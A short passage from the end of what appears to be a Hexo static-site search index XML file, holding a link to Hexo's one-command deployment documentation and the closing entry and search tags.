href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
